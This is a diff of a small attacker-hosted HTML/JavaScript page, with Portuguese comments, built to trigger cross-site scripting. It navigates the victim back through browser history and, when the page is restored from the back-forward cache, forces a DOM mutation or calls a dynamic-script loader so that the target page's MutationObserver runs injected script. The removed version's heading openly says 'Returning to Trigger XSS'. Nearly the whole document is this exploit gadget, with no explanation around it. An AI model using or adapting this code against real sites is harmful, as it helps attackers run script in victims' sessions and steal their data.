@@ -1,34 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Back Navigation Trigger</title>
-    <script>
-        const n = parseInt(new URLSearchParams(location.search).get("n")) || 1;
-        history.go(-n);
+<script>
+    const n = parseInt(new URLSearchParams(location.search).get("n")) || 1;
+    history.go(-n);
 
-        // Quando voltar via bfcache, tentar disparar addDynamicScript
-        window.addEventListener("pageshow", (event) => {
-            if (event.persisted) {
-                try {
-                    const config = window.CONFIG_SRC || document.querySelector("#CONFIG_SRC");
-                    if (config) {
-                        if (typeof addDynamicScript === "function") {
-                            addDynamicScript();
-                        } else {
-                            // Forçar uma mutação DOM caso o MutationObserver dispare o script
-                            const trigger = document.createElement("div");
-                            trigger.id = "triggerNode";
-                            document.body.appendChild(trigger);
-                        }
-                    }
-                } catch (e) {
-                    // Ignorar cross-origin errors
-                }
+    window.addEventListener("pageshow", (event) => {
+        if (event.persisted) {
+            const targetNode = document.getElementById("message");
+            if (targetNode) {
+                const newNode = document.createElement("div");
+                newNode.innerText = "Mutation Triggered";
+                targetNode.appendChild(newNode); // Tenta forçar o MutationObserver
             }
-        });
-    </script>
-</head>
-<body>
-    <h1>Returning to Trigger XSS...</h1>
-</body>
-</html>
+        }
+    });
+</script>
